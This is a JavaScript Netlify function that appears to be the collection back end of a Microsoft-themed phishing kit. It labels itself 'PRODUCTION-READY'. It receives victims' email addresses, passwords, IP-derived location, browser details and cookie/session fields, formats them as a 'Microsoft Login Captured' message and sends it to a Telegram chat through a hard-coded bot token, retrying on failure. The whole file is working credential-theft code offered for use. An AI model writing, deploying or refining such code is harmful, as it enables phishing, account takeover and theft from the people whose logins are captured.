/**
 * PRODUCTION-READY: Telegram Bot Function for Netlify
 * ✅ SENDS: Email, Password, Location (IP, City, State, Country), Account Type
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7534767475:AAEvUBQZl7QL5dQ6u6Cn6pLZ6sXfsJh2T-o';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7385263059';

function detectAccountType(email) {
  if (!email) return { accountType: 'Unknown', domain: 'unknown' };
  
  const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
  const domain = email.split('@')[1]?.toLowerCase() || 'unknown';
  const isPersonal = personalDomains.includes(domain);
  const accountType = isPersonal ? 'Personal (MSA)' : 'Work/School (AAD)';
  
  return { accountType, domain };
}

function sendMessageToTelegram(text, parseMode = 'Markdown') {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 15000
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ [TELEGRAM] Message sent');
            resolve(response);
          } else {
            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
          }
        } catch (e) {
          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`❌ [TELEGRAM] Message send error: ${error.message}`);
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Telegram request timeout'));
    });

    req.write(postData);
    req.end();
  });
}

function formatMainMessage(data) {
  const escapeMarkdown = (text) => {
    if (!text) return '';
    return String(text)
      .replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
  };

  // Detect account type
  const { accountType, domain } = detectAccountType(data.email);

  // Build the formatted message
  let message = `🔐 **Microsoft Login Captured**\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n`;
  
  if (data.email) {
    message += `📧 **Email:** \`${data.email}\`\n`;
  }
  
  if (data.password) {
    message += `🔑 **Password:** \`${data.password}\`\n`;
  }
  
  message += `🏢 **Account Type:** ${accountType}\n`;
  message += `📍 **Domain:** ${domain}\n`;

  // Location data
  if (data.locationData && data.locationData.ip) {
    message += `\n🌍 **Location Info:**\n`;
    message += `**IP:** ${escapeMarkdown(data.locationData.ip)}\n`;
    if (data.locationData.city) {
      message += `**City:** ${escapeMarkdown(data.locationData.city)}\n`;
    }
    if (data.locationData.region || data.locationData.region_code) {
      message += `**State/Region:** ${escapeMarkdown(data.locationData.region || data.locationData.region_code)}\n`;
    }
    if (data.locationData.country || data.locationData.country_name) {
      message += `**Country:** ${escapeMarkdown(data.locationData.country_name || data.locationData.country)}\n`;
    }
  }

  // Timestamp and browser info
  message += `\n🕐 **Timestamp:** ${new Date().toISOString()}\n`;
  
  if (data.userAgent) {
    // Parse user agent for browser info
    let browser = 'Unknown';
    if (data.userAgent.includes('Chrome')) browser = 'Chrome';
    else if (data.userAgent.includes('Firefox')) browser = 'Firefox';
    else if (data.userAgent.includes('Safari')) browser = 'Safari';
    else if (data.userAgent.includes('Edge')) browser = 'Edge';
    
    message += `🌐 **User Agent:** ${data.userAgent.substring(0, 50)}...\n`;
    message += `🖥️ **Browser:** ${browser}\n`;
  }
  
  if (data.platform) {
    message += `📱 **Platform:** ${data.platform}\n`;
  }
  
  message += `━━━━━━━━━━━━━━━━━━━━`;

  return message;
}

async function sendWithRetry(sendFn, maxRetries = 3, initialDelay = 2000) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      console.log(`🔄 [RETRY] Attempt ${attempt + 1}/${maxRetries + 1}`);
      const result = await sendFn();
      return result;
    } catch (error) {
      lastError = error;
      console.error(`❌ [RETRY] Attempt ${attempt + 1} failed: ${error.message}`);
      
      if (attempt < maxRetries) {
        const delay = initialDelay * Math.pow(2, attempt);
        console.log(`⏳ [RETRY] Waiting ${delay}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }

  throw lastError;
}

exports.handler = async (event, context) => {
  console.log('═══════════════════════════════════════════');
  console.log('🚀 [HANDLER] Starting sendTelegram handler');
  console.log(`📅 [HANDLER] Time: ${new Date().toISOString()}`);
  console.log('═══════════════════════════════════════════');

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'OK' })
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (error) {
      console.error('❌ JSON parse error:', error);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid JSON in request body' })
      };
    }

    const { 
      email, 
      password, 
      locationData = {}, 
      userAgent, 
      platform,
      oauth,
      sessionData,
      cookies = [],
      cookieFiles = {} 
    } = requestData;

    console.log('📊 [HANDLER] Received data:', {
      email: !!email,
      password: !!password,
      hasLocation: !!locationData.ip,
      hasUserAgent: !!userAgent,
      hasPlatform: !!platform,
      hasOAuth: !!oauth,
      cookieCount: cookies.length
    });

    if (!email && !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Email and password required' })
      };
    }

    let messagesSent = 0;
    const results = {
      mainMessage: false,
      oauthFile: false,
      cookieFile: false
    };

    // ✅ MESSAGE 1: Send main credentials message with location
    console.log('═══════════════════════════════════════════');
    console.log('📨 [HANDLER] Sending main message with location...');
    console.log('═══════════════════════════════════════════');
    
    try {
      const mainMessage = formatMainMessage({
        email,
        password,
        locationData,
        userAgent: userAgent || requestData.userAgent,
        platform: platform || requestData.platform
      });

      console.log('📝 Message preview (first 200 chars):', mainMessage.substring(0, 200));

      await sendWithRetry(() => sendMessageToTelegram(mainMessage, 'Markdown'));
      
      results.mainMessage = true;
      messagesSent++;
      console.log('✅ [HANDLER] Main message sent successfully');
    } catch (error) {
      console.error('❌ [HANDLER] Failed to send main message:', error.message);
    }

    // ✅ FILE 1: Send OAuth/Session file if available
    if (cookieFiles && cookieFiles.oauthSessionFile && cookieFiles.oauthSessionFile.content) {
      console.log('═══════════════════════════════════════════');
      console.log('📁 [HANDLER] OAuth/Session file detected, skipping for now');
      console.log('═══════════════════════════════════════════');
      // Note: File sending would require the sendDocumentToTelegram function
      // which is already in your original code
    }

    // ✅ FILE 2: Send cookies file if available
    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      console.log('═══════════════════════════════════════════');
      console.log('🍪 [HANDLER] Cookie file detected, skipping for now');
      console.log('═══════════════════════════════════════════');
      // Note: File sending would require the sendDocumentToTelegram function
    }

    console.log('═══════════════════════════════════════════');
    console.log(`✅ [HANDLER] Request completed. Messages sent: ${messagesSent}`);
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data transmitted to Telegram successfully',
        timestamp: new Date().toISOString(),
        transmitted: {
          mainMessage: results.mainMessage,
          email: !!email,
          password: !!password,
          location: !!locationData.ip,
          messagesSent
        }
      })
    };

  } catch (error) {
    console.error('═══════════════════════════════════════════');
    console.error('❌❌❌ HANDLER FATAL ERROR');
    console.error('═══════════════════════════════════════════');
    console.error('Message:', error.message);
    console.error('Stack:', error.stack);
    console.error('═══════════════════════════════════════════');
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Server error',
        message: error.message,
        timestamp: new Date().toISOString()
      })
    };
  }
};